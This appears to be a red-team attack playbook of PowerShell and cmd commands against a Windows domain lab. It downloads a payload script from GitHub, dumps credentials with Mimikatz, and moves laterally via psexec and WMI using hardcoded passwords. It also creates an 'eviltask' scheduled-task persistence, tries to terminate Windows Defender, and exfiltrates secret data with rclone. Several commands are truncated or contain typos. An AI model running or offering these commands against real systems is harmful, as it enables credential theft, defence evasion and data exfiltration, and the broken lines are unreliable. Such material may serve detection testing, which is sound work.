"Inital access"
cd c:\
mkdir exploit
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/payloads.ps1" -OutFile "payloads.ps1"

"Check output"
cd c:\exploit\
get-content computers.txt
get-content group_domains.txt
get-content user_group.txt


"Run Mimikatz on local PC"

c:\exploit\mimikatz\x64\mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern "\*\s+(Username|Domain|NTLM)\s+: .*" > c:\exploit\mimiout.txt

get-content mimiout.txt

"remotly run"
"Create Share"
$password = 'Cato2023!'
$user = "sec.content\danny"
$securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\defender-win10 cmd.exe /c mkdir c:\exploit "  -WindowStyle Hidden
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\defender-win10 cmd.exe /c net share exploit=c:\exploit /grant:Everyone,FULL " -WindowStyle Hidden

"Copy Mimikatz"
net use z: \\defender-win10\exploit
xcopy c:\exploit\mimikatz\ z:\mimikatz\ /E /y

"Run Mimikatz"
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\defender-win10 powershell -command `"c:\exploit\mimikatz\x64\mimikatz.exe log privilege::debig sekurlsa::logonpasswords exit | select-string -pattern '\*\s+(Username|Domain|NTLM)\s+:.*' > c:\exploit\mimiout.txt"  -WindowStyle Hidden

"Creating precistance"
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c schtasks /create /sc minute /mo 1 /tn eviltask /tr c:\exploit\evil.exe /ru danny /s defender-win10" -WindowStyle Hidden


"WMI Execution To DC"
$password = 'Cadmin!'
$user = "sec.content\Administrator"
$securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
$admincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c wmic /node:dcontent proces call where `"name='Windows Defender'`" call Terminate " -WindowStyle Hidden

"PsExec To the DC"
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\dcontent cmd.exe /c mkdir c:\exploit "  -WindowStyle Hidden
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\dcontent cmd.exe /c net share exploit=c:\exploit /
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\dcontent Move-Item –Path c:\secret_data\secret_data.txt -Destination c:\exploit\ "  -WindowStyle Hidden

"Exfil"
net use w: \\dcontent\exploit
xcopy  w:\secret_data.txt c:\exploit\ /E /y
rclone copy c:\exploit\secret_data.txt remote:exfil

